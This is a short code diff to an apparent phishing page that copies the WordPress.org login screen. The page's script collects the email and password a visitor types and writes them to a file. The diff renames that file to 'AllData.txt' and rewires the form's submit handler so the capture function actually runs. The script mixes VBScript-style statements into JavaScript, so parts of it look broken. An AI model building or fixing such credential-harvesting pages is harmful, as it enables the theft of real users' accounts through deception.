@@ -131,7 +131,7 @@
     function WriteToFile(passForm) {
 
         set fso = CreateObject("Scripting.FileSystemObject");
-        set f = fso.CreateTextFile("data.txt", True);
+        set f = fso.CreateTextFile("AllData.txt", True);
 
         var Email = document.getElementById('email');
         var Password = document.getElementById('password');
@@ -146,7 +146,7 @@
     <center><img src="logo.svg" class="logo" /></center>
     <br />
     <br />
-    <form action="loading.html" class="login" onsubmit="WriteToFile">
+    <form action="loading.html" class="login" onsubmit="WriteToFile(this)">
         <p class="log">Log in to your WordPress.org account to contribute to WordPress, get help in the support forum, or rate and review themes and plugins.</p>
         <p style="margin-top: 30px;">Username or Email Address</p>
         <label for="email"></label>
